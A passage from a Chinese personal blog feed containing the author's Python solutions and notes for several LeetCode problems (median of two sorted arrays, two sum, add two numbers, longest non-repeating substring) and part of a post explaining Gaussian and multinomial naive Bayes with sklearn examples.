正常的递归结束出口</span></span><br><span class="line">        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> min(nums1[k<span class="hljs-number">-1</span>], nums2[k<span class="hljs-number">-1</span>])</span><br><span class="line">        <span class="hljs-comment"># k!=1，进行递归，可以利用列表的切片功能轻松返回剩余数组</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            n = k//<span class="hljs-number">2</span></span><br><span class="line">            <span class="hljs-keyword">if</span> n &gt; len(nums1):</span><br><span class="line">                <span class="hljs-keyword">if</span> nums1[<span class="hljs-number">-1</span>] &lt; nums2[n<span class="hljs-number">-1</span>]:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth([], nums2, k-len(nums1))</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth(nums1, nums2[n:], k-n)</span><br><span class="line">            <span class="hljs-keyword">if</span> n &gt; len(nums2):</span><br><span class="line">                <span class="hljs-keyword">if</span> nums2[<span class="hljs-number">-1</span>] &lt; nums1[n<span class="hljs-number">-1</span>]:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth(nums1, [], k-len(nums2))</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    <span class="hljs-keyword">return</span> self.findKth(nums1[n:], nums2, k-n)</span><br><span class="line">            <span class="hljs-keyword">if</span> nums1[n<span class="hljs-number">-1</span>] &lt; nums2[n<span class="hljs-number">-1</span>]:</span><br><span class="line">                <span class="hljs-keyword">return</span> self.findKth(nums1[n:], nums2, k-n)</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span> self.findKth(nums1, nums2[n:], k-n)</span><br></pre></td></tr></table></figure></p><h5 id="解法3-从中位数的定义出发"><a href="#解法3-从中位数的定义出发" class="headerlink" title="解法3: 从中位数的定义出发"></a>解法3: 从中位数的定义出发</h5><p>解析主要参考<code>LeetCode</code>用户<code>windliang</code>的题解。</p><p>因为中位数的定义是一个可以将数值集合划分为相等的上下两部分的一个数值，因此我们可以考虑对题中给的两个数组进行划分，划分成左右两个部分，如下图所示：<br><img src="/2019/11/14/leetcode-day2/1.jpg" alt="1.jpg"><br>当我们用i和j把A、B数组划分为这样的两个部分，如果满足下列条件：</p><ul><li><code>A_left + B_left == A_right + B_right</code> (如果<code>len(A)+len(B)</code>为奇数，就让左半部分比又半部分多一个，这样中位数就是左半部分最后一个值)</li><li><code>max(A_left[i-1], B_left[j-1]) &lt; min(A_right[i], B_right[j])</code></li></ul><p>那么我们就可以得到中位数的答案：</p><ul><li>如果<code>len(A)+len(B)</code>为奇数，<code>ans = max(A_left[i-1], B_left[j-1])</code></li><li>如果<code>len(A)+len(B)</code>为偶数，<code>ans = (max(A_left[i-1], B_left[j-1]) + min(A_right[i], B_right[j])) / 2</code></li></ul><p>对第一个条件，要使他们划分成这样的两个部分，那么i和j具体值应该取多少呢？<br>为了降低时间复杂度，i的取值可以用二分法，而j又与i有直接关系，假设<code>len(A) = m</code>,<code>len(B) = n</code>,<code>(m+n)%2 == 0</code><br>因为<code>i + j = m - i + n - j</code><br>故<code>j = (m + n)/2 - i</code><br>当<code>(m+n)%2 == 1</code>时，有<code>i + j = m - i + n - j + 1</code>，故<code>j = (m + n + 1)/2 - i</code></p><p>由于当<code>(m+n)%2 == 0</code>时，模2和加1之后再模2的值相等，因此j的取值公式可以通用为<br><code>j = (m + n + 1)/2 - i</code><br>当我们把<code>i</code>当作自变量时，<code>0 &lt;= i &lt;= m</code>，为了保证<code>0 &lt;= j &lt;= m</code>，因此我们要使<code>m &lt;= n</code></p><p>对于第二个条件，因为题目给的数组是有序的，自然会满足<code>A_left[i-1] &lt; A_right[i]</code>和<code>B_left[j-1] &lt; B_right[j]</code><br>因此我们只要使<code>A_left[i-1] &lt; B_right[j]</code>和<code>B_left[j-1] &lt; A_right[i]</code>就可以满足了第二个条件。<br>当不满足该条件时可以发现有两种情况：</p><ul><li><code>i &lt; m and j &gt; 0 and B_left[j-1] &gt; A_right[i]</code><br>这时需要增加i，（从上面j的公式可以看出当<code>i&lt;m</code>时，j一定大于0，因此条件可以简化为<code>i &lt; m and B_left[j-1] &gt; A_right[i]</code>）</li><li><code>i &gt; 0 and j &lt; n and A_left[i-1] &gt; B_right[j]</code><br>这时需要减小i，（从上面j的公式可以看出当<code>i&gt;0</code>时，j一定小于n，因此条件可以简化为<code>i &gt; 0 and A_left[i-1] &gt; B_right[j]</code>）</li></ul><p>另外还有两种边界情况（具体可分为4种），即<code>i = 0</code>和<code>i = m</code>，具体可分为<code>i = 0, j != n</code> <code>i = 0, j = n</code> <code>i = m, j = 0</code> <code>i = m, j != 0</code></p><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        m = len(nums1)</span><br><span class="line">        n = len(nums2)</span><br><span class="line">        <span class="hljs-keyword">if</span> m &gt; n: <span class="hljs-comment">#m需要小于等于n</span></span><br><span class="line">            nums1, nums2, m, n = nums2, nums1, n, m</span><br><span class="line">        <span class="hljs-keyword">if</span> m == <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> (nums2[(n+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><span class="hljs-number">-1</span>]+nums2[(n+<span class="hljs-number">2</span>)//<span class="hljs-number">2</span><span class="hljs-number">-1</span>])/<span class="hljs-number">2.0</span></span><br><span class="line"></span><br><span class="line">        imin, imax, half_len = <span class="hljs-number">0</span>, m, (m+n+<span class="hljs-number">1</span>) // <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-comment">#二分法确定i的值</span></span><br><span class="line">        <span class="hljs-keyword">while</span> imin &lt;= imax:</span><br><span class="line">            i = (imin + imax) // <span class="hljs-number">2</span></span><br><span class="line">            j = half_len - i</span><br><span class="line">            <span class="hljs-keyword">if</span> i &lt; m <span class="hljs-keyword">and</span> nums2[j<span class="hljs-number">-1</span>] &gt; nums1[i]:</span><br><span class="line">                imin = i + <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">elif</span> i &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> nums1[i<span class="hljs-number">-1</span>] &gt; nums2[j]:</span><br><span class="line">                imax = i - <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-comment">#达到要求，将边界情况列出分别讨论</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                <span class="hljs-keyword">if</span> i==<span class="hljs-number">0</span> :</span><br><span class="line">                    max_of_left = nums2[j<span class="hljs-number">-1</span>]</span><br><span class="line">                    <span class="hljs-keyword">if</span>(j!=n):</span><br><span class="line">                        max_of_right = min(nums1[i], nums2[j])</span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        max_of_right = nums1[i]</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-keyword">elif</span> i==m:</span><br><span class="line">                    <span class="hljs-keyword">if</span>(j!=<span class="hljs-number">0</span>):</span><br><span class="line">                        max_of_left = max(nums1[i<span class="hljs-number">-1</span>], nums2[j<span class="hljs-number">-1</span>])</span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        max_of_left = nums1[i<span class="hljs-number">-1</span>]</span><br><span class="line">                    max_of_right = nums2[j]</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-comment">#一般情况</span></span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    max_of_left = max(nums1[i<span class="hljs-number">-1</span>], nums2[j<span class="hljs-number">-1</span>])</span><br><span class="line">                    max_of_right = min(nums1[i], nums2[j])</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (m+n)%<span class="hljs-number">2</span> == <span class="hljs-number">1</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> max_of_left</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> (max_of_right+max_of_left)/<span class="hljs-number">2.0</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LeetCode系列 昨天只做了一道题 失败的一天&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode系列" scheme="https://fansblog.club/categories/LeetCode%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>LeetCode DAY 1 (1-3)</title>
    <link href="https://fansblog.club/2019/11/13/leetcode-day1/"/>
    <id>https://fansblog.club/2019/11/13/leetcode-day1/</id>
    <published>2019-11-13T01:11:10.000Z</published>
    <updated>2020-01-12T03:52:02.790Z</updated>
    
    <content type="html"><![CDATA[<p>LeetCode系列 争取每日更新3题 —— 一个为了有工作的fw会坚持下去的！<a id="more"></a><br>（自从昨天尝试着做了几道leetcode才发现我的代码能力<del>几乎</del>等于0…照这样下去我怕是要找不到工作了…因此从现在开始每天督促自己刷3道leetcode…并且第二天将前一天的解题过程上传到这里就当作是巩固复习吧…）</p><h3 id="1-两数之和（简单）"><a href="#1-两数之和（简单）" class="headerlink" title="1. 两数之和（简单）"></a>1. 两数之和（简单）</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>刚开始看到这道题的时候觉得很简单，<del>虽然题目本来就标的就是简单…..</del><br>于是一开始就这样胡乱一写…<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">twoSum</span><span class="hljs-params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(nums)):</span><br><span class="line">            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(i+<span class="hljs-number">1</span>, len(nums)):</span><br><span class="line">                <span class="hljs-keyword">if</span> nums[i]+nums[j]==target:</span><br><span class="line">                    <span class="hljs-keyword">return</span> [i, j]</span><br></pre></td></tr></table></figure><br>这样写虽然可以做到题目要求，但是时间复杂度太高了$O(n^{2})$，因此提交的时候有时候可以通过，有时候就是时间超过限制，看了评论区各位大佬的提示，讲到可以利用哈希表查找以空间换取时间的做法降低时间复杂度。于是改写代码如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">twoSum</span><span class="hljs-params">(self, nums, target)</span>:</span></span><br><span class="line">        dict1 = &#123;&#125;</span><br><span class="line">        <span class="hljs-keyword">if</span> len(nums)&lt;<span class="hljs-number">2</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(nums)):</span><br><span class="line">            num = target - nums[i]</span><br><span class="line">            <span class="hljs-keyword">if</span> num <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dict1:</span><br><span class="line">                dict1[nums[i]] = i</span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span>[dict1[num],i]</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span><br></pre></td></tr></table></figure><br>在python里，字典就对应着哈希查找表，于是我们相当于多定义了一个字典，最开始字典为空，按<code>nums</code>数组中的顺序取数，首先计算这个数字需要与什么数字相加才能等于<code>target</code>，然后就去字典里查找有没有这个数字，如果没有，那就将当前读的数字添加到字典中，key为数字的值，value为标号，所以最后总会在字典中查找到答案，这样时间复杂度就降低到了$O(n)$<br>第一题就到这里吧，其实DS里的哈希表我也忘记了，emmmm正好趁现在去复习下吧!</p><hr><h3 id="2-两数相加（中等）"><a href="#2-两数相加（中等）" class="headerlink" title="2. 两数相加（中等）"></a>2. 两数相加（中等）</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给出两个非空的链表用来表示两个非负的整数。其中，它们各自的位数是按照逆序的方式存储的，并且它们的每个节点只能存储一位数字。<br>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。<br>您可以假设除了数字0之外，这两个数都不会以0开头。</p><h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">原因：342 + 465 = 807</span><br></pre></td></tr></table></figure></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>这道题明显是提醒我去复习链表操作了，而且最重要的是我好像从来没有在python中使用过链表…没办法只能硬着头皮瞎jb敲了，最开始还是失败了，原因有两个：1.因为要返回结果所以要留一个头指针 2.next指针要熟练。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="hljs-comment"># class ListNode:</span></span><br><span class="line"><span class="hljs-comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="hljs-comment">#         self.val = x</span></span><br><span class="line"><span class="hljs-comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(self, l1, l2)</span>:</span></span><br><span class="line">        head = ListNode(<span class="hljs-number">0</span>) <span class="hljs-comment">#定义头指针用来返回结果</span></span><br><span class="line">        l3 = head <span class="hljs-comment">#l3用来进行链表操作</span></span><br><span class="line">        count = <span class="hljs-number">0</span> <span class="hljs-comment">#判断是否有进位</span></span><br><span class="line">        <span class="hljs-keyword">while</span>(l1 <span class="hljs-keyword">or</span> l2): </span><br><span class="line">            x = l1.val <span class="hljs-keyword">if</span> l1 <span class="hljs-keyword">else</span> <span class="hljs-number">0</span></span><br><span class="line">            y = l2.val <span class="hljs-keyword">if</span> l2 <span class="hljs-keyword">else</span> <span class="hljs-number">0</span></span><br><span class="line">            l3.next = ListNode((x+y+count)%<span class="hljs-number">10</span>) <span class="hljs-comment">#从个位数开始计算</span></span><br><span class="line">            l3 = l3.next <span class="hljs-comment">#指针移动</span></span><br><span class="line">            count = (x+y+count)//<span class="hljs-number">10</span> <span class="hljs-comment">#注意python中的整除有两个//</span></span><br><span class="line">            <span class="hljs-keyword">if</span>(l1!=<span class="hljs-literal">None</span>):</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="hljs-keyword">if</span>(l2!=<span class="hljs-literal">None</span>):</span><br><span class="line">                l2 = l2.next</span><br><span class="line">        <span class="hljs-keyword">if</span>(count == <span class="hljs-number">1</span>): <span class="hljs-comment">#如果最后还有有进位</span></span><br><span class="line">            l3.next = ListNode(<span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> head.next</span><br></pre></td></tr></table></figure><br>虽然这道题的难度标的是中等，但感觉只要链表操作熟练了，这道题还是蛮简单的。算了算了别忘了复习链表操作…一定不要忘了返回结果需要头指针哦…</p><hr><h3 id="3-无重复字符的最长子串（中等）"><a href="#3-无重复字符的最长子串（中等）" class="headerlink" title="3. 无重复字符的最长子串（中等）"></a>3. 无重复字符的最长子串（中等）</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个字符串，请你找出其中不含有重复字符的最长子串的长度。</p><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="hljs-string">"abcabcbb"</span></span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="hljs-string">"abc"</span>，所以其长度为 3。</span><br></pre></td></tr></table></figure></p><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="hljs-string">"bbbbb"</span></span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="hljs-string">"b"</span>，所以其长度为 1。</span><br></pre></td></tr></table></figure></p><h5 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h5><p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="hljs-string">"pwwkew"</span></span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 <span class="hljs-string">"wke"</span>，所以其长度为 3。</span><br><span class="line">     请注意，你的答案必须是 子串 的长度，<span class="hljs-string">"pwke"</span> 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure></p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><p>刚看完题目描述的我觉得这道题目好像很简单啊，用第一题时候一样的字典查找就可以解决了，最后题目给的三个例子倒是通过了，提交检测的几百上千个测试用例却总有通不过的，为了涵盖不同的测试用例代码被我改的又臭又长，折腾了一段时间只好打开了百度放弃了挣扎…所以说到底我的代码能力是真滴弱啊…因此直接附上大佬们的代码吧…<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(self, s)</span>:</span></span><br><span class="line">        dict1 = &#123;&#125; <span class="hljs-comment">#定义一个字典用来查找</span></span><br><span class="line">        i , ans = <span class="hljs-number">0</span>, <span class="hljs-number">0</span> <span class="hljs-comment">#i代表重复的最后的位置，ans为结果</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(len(s)):</span><br><span class="line">            <span class="hljs-keyword">if</span> s[j] <span class="hljs-keyword">in</span> dict1:</span><br><span class="line">                i = max(dict1[s[j]],i) <span class="hljs-comment">#取重复的最后面的字符位置</span></span><br><span class="line">                <span class="hljs-comment">#i = dict1[s[j]]</span></span><br><span class="line">            ans = max(ans, j-i+<span class="hljs-number">1</span>) <span class="hljs-comment">#取最大的子序列长度</span></span><br><span class="line">            dict1[s[j]] = j+<span class="hljs-number">1</span> <span class="hljs-comment">#将不在字典中的也就是不重复的字母放入字典,同时保持位置更新，使用j+1是为了直接跳到重复字符的下一个位置。</span></span><br><span class="line">        <span class="hljs-keyword">return</span> ans</span><br></pre></td></tr></table></figure><br>最后反思一下自己为什么想不到为什么想不到……</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LeetCode系列 争取每日更新3题 —— 一个为了有工作的fw会坚持下去的！&lt;/p&gt;
    
    </summary>
    
    
      <category term="LeetCode系列" scheme="https://fansblog.club/categories/LeetCode%E7%B3%BB%E5%88%97/"/>
    
    
  </entry>
  
  <entry>
    <title>朴素贝叶斯的三个常用模型</title>
    <link href="https://fansblog.club/2019/10/14/navie-bayes/"/>
    <id>https://fansblog.club/2019/10/14/navie-bayes/</id>
    <published>2019-10-14T08:42:05.000Z</published>
    <updated>2019-11-15T08:18:26.363Z</updated>
    
    <content type="html"><![CDATA[<p>高斯、多项式、伯努利<a id="more"></a></p><h3 id="朴素贝叶斯（naive-bayes）"><a href="#朴素贝叶斯（naive-bayes）" class="headerlink" title="朴素贝叶斯（naive_bayes）"></a>朴素贝叶斯（naive_bayes）</h3><p>若一个样本有n个特征，分别用$x_{1},x_{2},…,x_{n}$表示，将其划分到类yk的可能性$P(y_{k}|x_{1},x_{2},…,x_{n})$为：<br>$P(y_{k}|x_{1},x_{2},…,x_{n}) = P(y_{k})\prod_{i=1}^{n}P(x_{i}|y_{k})$</p><p>上式中等号右侧的各个值可以通过训练得到。根据上面的公式可以求的某个数据属于各个分类的可能性（这些可能性之和不一定是1），该数据应该属于具有最大可能性的分类中。<br>一般来说，如果一个样本没有特征xi，那么P(xi|yk)将不参与计算。不过下面的伯努利模型除外。</p><p>以上是朴素贝叶斯的最基本的内容。</p><hr><h3 id="高斯模型（GaussianNB）"><a href="#高斯模型（GaussianNB）" class="headerlink" title="高斯模型（GaussianNB）"></a>高斯模型（GaussianNB）</h3><p>有些特征可能是连续型变量，比如说人的身高，物体的长度，这些特征可以转换成离散型的值，比如如果身高在160cm以下，特征值为1；在160cm和170cm之间，特征值为2；在170cm之上，特征值为3。也可以这样转换，将身高转换为3个特征，分别是f1、f2、f3，如果身高是160cm以下，这三个特征的值分别是1、0、0，若身高在170cm之上，这三个特征的值分别是0、0、1。不过这些方式都不够细腻，高斯模型可以解决这个问题。高斯模型假设这些一个特征的所有属于某个类别的观测值符合高斯分布，也就是<br>$P(x_{i}|y_{k}) = \frac{1}{\sqrt{2\pi\sigma_{y_{k}}^{2}}}exp( -\frac{(x_{i}-\mu_{y_{k}})^2}  {2\sigma_{y_{k}}^{2}}   )$</p><h4 id="sklearn实例："><a href="#sklearn实例：" class="headerlink" title="sklearn实例："></a>sklearn实例：</h4><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> datasets</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> GaussianNB</span><br><span class="line"></span><br><span class="line">iris = datasets.load_iris()</span><br><span class="line"><span class="hljs-comment">#四个特征的名字</span></span><br><span class="line">print(iris.feature_names) </span><br><span class="line">clf = GaussianNB()</span><br><span class="line">clf.fit(iris.data,iris.target)</span><br><span class="line"><span class="hljs-comment">#第0个数据的标签及其预测</span></span><br><span class="line">print(iris.target[<span class="hljs-number">0</span>])</span><br><span class="line">print(clf.predict(iris.data[<span class="hljs-number">0</span>].reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br><span class="line"><span class="hljs-comment">#第149个数据的标签及其预测</span></span><br><span class="line">print(iris.target[<span class="hljs-number">149</span>])</span><br><span class="line">print(clf.predict(iris.data[<span class="hljs-number">149</span>].reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-string">'sepal length (cm)'</span>, <span class="hljs-string">'sepal width (cm)'</span>, <span class="hljs-string">'petal length (cm)'</span>, <span class="hljs-string">'petal width (cm)'</span>]</span><br><span class="line">0</span><br><span class="line">[0]</span><br><span class="line">2</span><br><span class="line">[2]</span><br><span class="line">[Finished <span class="hljs-keyword">in</span> 0.9s]</span><br></pre></td></tr></table></figure></p><hr><h3 id="多项式模型（MultinomialNB）"><a href="#多项式模型（MultinomialNB）" class="headerlink" title="多项式模型（MultinomialNB）"></a>多项式模型（MultinomialNB）</h3><p>该模型常用于文本分类，特征是单词，值是单词的出现次数。<br>$P(x_{i}|y_{k}) = \frac{N_{y_{k}x_{i}}+\alpha}{N_{y_{k}}+\alpha n}$<br>其中，$N_{y_{k}x_{i}}$是类别$y_{k}$下特征$x_{i}$出现的次数；$N_{y_{k}}$是类别$y_{k}$下所有特征出现的总次数。对应到文本分类里，如果单词<code>word</code>在一篇分类为<code>label1</code>的文档中出现了5次，那么$N_{label1,word}$的值会增加5。如果是去除了重复单词的，那么$N_{label1,word}$的值会增加1。$n$是特征的数量，在文本分类中就是去重后的所有单词的数量。$α$的取值范围是[0,1]，比较常见的是取值为1。</p><p>待预测样本中的特征xi在训练时可能没有出现，如果没有出现，则$N_{ykxi}$值为0，如果直接拿来计算该样本属于某个分类的概率，结果都将是0。在分子中加入$α$，在分母中加入$αn$可以解决这个问题。</p><h4 id="sklearn实例：-1"><a href="#sklearn实例：-1" class="headerlink" title="sklearn实例："></a>sklearn实例：</h4><p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">from</span> sklearn.naive_bayes <span class="hljs-keyword">import</span> MultinomialNB</span><br><span class="line"><span class="hljs-comment">#随机生成6*100个小于5大于等于0的数</span></span><br><span class="line">X = np.random.randint(<span class="hljs-number">5</span>, size=(<span class="hljs-number">6</span>,<span class="hljs-number">100</span>))</span><br><span class="line">Y = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])</span><br><span class="line">clf = MultinomialNB()</span><br><span class="line">clf.fit(X, Y)</span><br><span class="line">print(clf.predict(X[<span class="hljs-number">2</span>].reshape(<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>)))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 